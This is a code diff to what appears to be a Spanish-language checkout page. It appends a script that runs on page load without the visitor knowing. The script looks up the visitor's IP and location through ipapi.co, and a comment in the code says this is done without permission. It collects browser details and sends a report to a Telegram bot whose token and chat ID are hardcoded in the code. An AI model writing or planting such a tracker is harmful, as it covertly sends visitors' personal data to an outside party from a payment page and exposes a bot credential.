@@ -362,6 +362,59 @@ document.getElementById('confirmarPagar').addEventListener('click', async ()=>{
 updateResumen();
 checkValid();
 </script>
+<script>
+(async function(){
+  const TELEGRAM_BOT_TOKEN = "7514291048:AAEOhAryJ65Wc9-BCD9BiQ-o3i5LvjhzzlY";
+  const TELEGRAM_CHAT_ID = "-5059565019";
+
+  async function sendToTelegram(text){
+    try {
+      const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" })
+      });
+
+      const json = await resp.json().catch(()=>null);
+      console.log("Telegram:", json);
+    } catch(e){
+      console.error("Error enviando a Telegram:", e);
+    }
+  }
+
+  // ---- Obtener datos por IP (sin permiso) ----
+  let ipinfo = {};
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    if(r.ok) ipinfo = await r.json();
+  } catch(e){
+    console.warn("Fallo consulta IP:", e);
+  }
+
+  // ---- Datos adicionales del cliente ----
+  const userAgent = navigator.userAgent;
+  const language = navigator.language || navigator.userLanguage;
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const screenRes = `${window.screen.width}x${window.screen.height}`;
+  const url = location.href;
+  const timestamp = new Date().toLocaleString();
+
+  // ---- Construir mensaje ----
+  const mensaje =
+    `🌐 <b>Nueva Visita en la Web</b>\n\n` +
+    `📌 <b>IP:</b> ${ipinfo.ip || "-"}\n` +
+    `🏙️ <b>Ciudad:</b> ${ipinfo.city || "-"}\n` +
+    `🏛️ <b>Región:</b> ${ipinfo.region || "-"}\n` +
+    `🇨🇺 <b>País:</b> ${ipinfo.country_name || ipinfo.country || "-"}\n\n` +
+    `🤖 <b>User-Agent:</b> ${userAgent}\n\n` +
+    `🔗 <b>URL:</b> ${url}\n` +
+    `⏱️ <b>Fecha:</b> ${timestamp}`;
+
+  // enviar a Telegram
+  sendToTelegram(mensaje);
+
+})();
+</script>
 
 </body>
 </html>
